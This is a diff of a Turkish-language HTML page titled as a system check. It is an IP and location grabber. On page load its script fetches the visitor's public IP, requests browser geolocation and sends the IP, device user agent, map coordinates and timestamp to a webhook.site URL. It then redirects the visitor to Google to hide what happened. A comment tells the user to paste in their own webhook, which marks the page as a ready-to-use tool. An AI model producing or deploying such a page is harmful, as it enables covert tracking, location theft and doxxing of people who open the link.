@@ -1,29 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Yükleniyor...</title>
+    <title>Sistem Kontrol Ediliyor...</title>
 </head>
 <body>
     <script>
-        // Buradaki URL'yi 3. Adımda değiştireceğiz
+        // BURAYA KENDİ WEBHOOK LİNKİNİ YAPIŞTIR
         const webhookURL = "https://webhook.site/37bb967a-e91f-4081-b0a2-8daecb562326";
 
-        fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ip = data.ip;
-            const userAgent = navigator.userAgent;
-
+        function verileriGonder(ip, konumVerisi = "İzin Verilmedi") {
             fetch(webhookURL, {
                 method: 'POST',
                 mode: 'no-cors',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ ip: ip, cihaz: userAgent })
+                body: JSON.stringify({
+                    ip_adresi: ip,
+                    cihaz: navigator.userAgent,
+                    harita_konumu: konumVerisi,
+                    zaman: new Date().toLocaleString()
+                })
             }).then(() => {
-                // Bilgiyi gönderdikten sonra kullanıcıyı başka yere yönlendir
+                // Bilgi gidince Google'a yolla
                 window.location.href = "https://www.google.com";
             });
-        });
+        }
+
+        // Önce IP'yi al
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => {
+                const userIP = ipData.ip;
+
+                // Konum izni iste
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            // İzin verildi, koordinatları al
+                            const link = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+                            verileriGonder(userIP, link);
+                        },
+                        () => {
+                            // İzin reddedildi
+                            verileriGonder(userIP, "Kullanıcı Konum İznini Reddetti");
+                        },
+                        { timeout: 5000 }
+                    );
+                } else {
+                    verileriGonder(userIP, "Tarayıcı GPS Desteklemiyor");
+                }
+            });
     </script>
 </body>
 </html>
